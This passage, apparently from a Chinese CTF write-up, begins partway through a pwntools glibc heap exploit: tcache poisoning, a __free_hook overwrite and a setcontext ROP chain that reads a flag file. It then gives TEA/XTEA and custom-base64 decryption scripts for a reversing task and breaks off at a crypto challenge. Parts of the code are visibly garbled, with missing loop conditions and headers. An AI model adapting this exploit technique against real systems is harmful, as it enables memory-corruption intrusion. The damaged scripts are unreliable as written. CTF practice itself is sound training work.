            Add(0xe0, '2'*8)
        print("tcahe hajack2")
        Delete(45)
        Delete(35)
        #gdb.attach(p, 'bp $rebase(0xf32)')
        a1 = enc(heap_addr+0x1550, free_hook+0xe0)
        print("addr:",hex(a1))
        payload = 'a'*0x80+p64(0)+p64(0xf1)+p64(a1)
        Add(0x100, payload)  #50
        Add(0xe0, 'a'*8)   #51
        for i in range(8):  #52-59
            Add(0xb0, '2'*8)
        for i in range(8):  #60-67
            Add(0xd0, '3'*8)
        for i in range(8):
            Delete(52+i)
        for i in range(7):
            Delete(61+i)
        print("chunk consolidate 3")
        Delete(60)
        for i in range(7):  #68-74
            Add(0xd0, '2'*8)
        print("tcahe hajack3")
        Delete(70)
        Delete(60)
        #gdb.attach(p, 'bp $rebase(0xf32)')
        a1 = enc(heap_addr+0x22d0, free_hook+0x1c0)
        print("addr:",hex(a1))
        payload = 'a'*0xb0+p64(0)+p64(0xf1)+p64(a1)
        Add(0x100, payload)  #75
        Add(0xd0, 'a'*8)   #76
        p_rdi_r = 0x277d6+libc_addr
        p_rsi_r = 0x32032 + libc_addr
        p_rdx_r = 0xc800d + libc_addr
        p_rax_r = 0x45580 + libc_addr
        syscall = 0x611ea+libc_addr
        ret = 0xbcc1b + libc_addr
        flag_str_addr = free_hook + 0x210
        flag_addr = free_hook + 0x300
        open_addr = libc_addr+libc.sym['open']
        read_addr = libc_addr + libc.sym['read']
        write_addr = libc_addr+libc.sym['write']
        orw = flat([
            p_rdi_r, flag_str_addr,
            p_rsi_r, 0,
            open_addr,
            p_rdi_r, 3,
            p_rsi_r, flag_addr,
            p_rdx_r, 0x40,
            read_addr,
            p_rdi_r, 1,
            p_rsi_r, flag_addr,
            p_rdx_r, 0x40, 0,
            write_addr
        ])
        setcontext = libc_addr + libc.sym['setcontext']
        magic_addr = libc_addr + 0x14b760
        orw_addr = free_hook+0x110
        frame_addr = free_hook
        payload = p64(magic_addr)
        payload += magic_frame(frame_addr, setcontext + 61, 0, 0, 0, orw_addr, ret)
        payload = payload.ljust(0x110, b'\x00') + orw
        payload = payload.ljust(0x220, b'\x00') + './flag\x00'
        print('magic:',hex(magic_addr))
        p1 = payload[:0xe0]
        p2 = payload[0xe0:0x1d0]
        p3 = payload[0x1d0:]
        #gdb.attach(p, 'bp $rebase(0xf32)')
        Add(0xd0, p3)
        Add(0xe0, p2)
        Add(0xf0, p1)
        Delete(79)
        p.interactive()
    Pwn()
## Reverse
###  drinkSomeTea
题目给了一个exe文件和加密过的png图片，ida打开可以发现是一个文件加密的程序，其中有一个花指令
手动修一下后还原成`function`即可发现这是一个`tea`加密，这里需要注意的是`output0`和`output1`和普通的`tea`不同，是`int`而非`unsigned
int`，所以用平常的`tea`脚本得出的结果会不一样
`tea`的`key`就是`flag{fake_flag!}`，那么我们编写对应的脚本进行解密
    #include 
    #include 
    #include 
    #include 
    #include 
    void decrypt(int *A,unsigned int *B){
        int v0 = A[0],v1 = A[1];
      unsigned int sum = 0xC6EF3720,delta = 0x9E3779B9;
        for(int i = 0; i > 5) + B[3]);
                    v0 -= ((v1 > 5) + B[1]);
            sum -= delta;
        }
        A[0] = v0;
        A[1] = v1;
    }
    int main(){
        unsigned int key[4] = {0x67616c66,0x6b61667b,0x6c665f65,0x7d216761};
        FILE *op = NULL;
        op = fopen("./tea.png", "w+");
        int fp = -1;
        fp = open("./tea.png.out", O_RDONLY);
        unsigned char buff[9];
        for(int round = 0; round >= 8;
                }
            }
            for(int i = 0; i 8}'.format(str(bin(ord(c)))[2:])
            while len(bins) % 3:
                bins += '00000000'
            d = 1
            for i in range(6, len(bins) + int(len(bins) / 6), 7):
                bins = bins[:i] + ' ' + bins[i:]
            bins = bins.split(' ')
            if '' in bins:
                bins.remove('')
            base64 = str()
            for b in bins:
                if b == '000000':
                    base64 += '='
                else:
                    base64 += self.table[int(b, 2)]
            return base64
        def decode(self, text):
            bins = str()
            for c in text:
                if c == '=':
                    bins += '000000'
                else:
                    bins += '{:0>6}'.format(str(bin(self.table.index(c)))[2:])
            for i in range(8, len(bins) + int(len(bins) / 8), 9):
                bins = bins[:i] + ' ' + bins[i:]
            bins = bins.split(' ')
            if '' in bins:
                bins.remove('')
            text = str()
            for b in bins:
                if not b == '00000000':
                    text += chr(int(b, 2))
            return text
        def test(self):
            e = 'Running Class Test'
            d = 'UnVubmluZyBDbGFzcyBUZXN0'        
            if e == decode(d) and d == encode(e):
                return True
            else:
                return False
    _inst = b64()
    encode = _inst.encode
    decode = _inst.decode
    if __name__ == '__main__':
        s = "yQXHyBvN3g/81gv51QXG1QTBxRr/yvXK1hC="
        print(decode(s))
可以得到`combustible_oolong_tea_plz`  
之后程序进行了一个`xtea`和`xor`的操作
那么我们按照这个逻辑解密即可得到flag
    from Crypto.Util.number import *
    enc = [2,5,4,13,3,84,11,4,87,3,86,3,80,7,83,3,0,4,83,94,7,84,4,0,1,83,3,84,6,83,5,80]
    def decrypt(A,B):
        delta = 2654435464
        v0 = A[0]
        v1 = A[1]
        s = 0
        for i in range(32):
            v0 += (v1 > 5) + v1 ^ s + B[s & 3]
            v0 &= 0xffffffff
            s += delta
            s &= 0xffffffff
            v1 += (v0 > 5) + v0 ^ s + B[(s >> 11) & 3]
            v1 &= 0xffffffff
        return [v0,v1]
    A = [288,369]
    B = b"combustible_oolong_tea_plz"
    B = [i for i in B]
    [v0,v1] = decrypt(A,B)
    v0 = long_to_bytes(v0)
    v1 = long_to_bytes(v1)
    key = (v0 + v1).hex()
    key = [ord(i) for i in key]
    flag = ""
    for i in range(len(enc)):
        flag += chr(key[i % len(key)] ^ enc[i])
    print(flag)
## Crypto
###  crypto_threshold
题目代码如下
    import random
    from sympy import nextprime
    from Crypto.Util.number import *